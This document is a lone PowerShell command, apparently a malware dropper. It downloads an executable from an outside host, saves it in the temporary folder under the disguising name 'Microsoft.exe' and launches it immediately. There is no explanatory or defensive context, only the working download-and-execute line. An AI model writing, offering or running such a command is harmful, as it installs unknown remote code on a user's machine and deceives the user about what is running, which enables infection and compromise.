
(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/Iot',"$env:TEMP\Microsoft.exe");Start-Process ("$env:TEMP\Microsoft.exe")

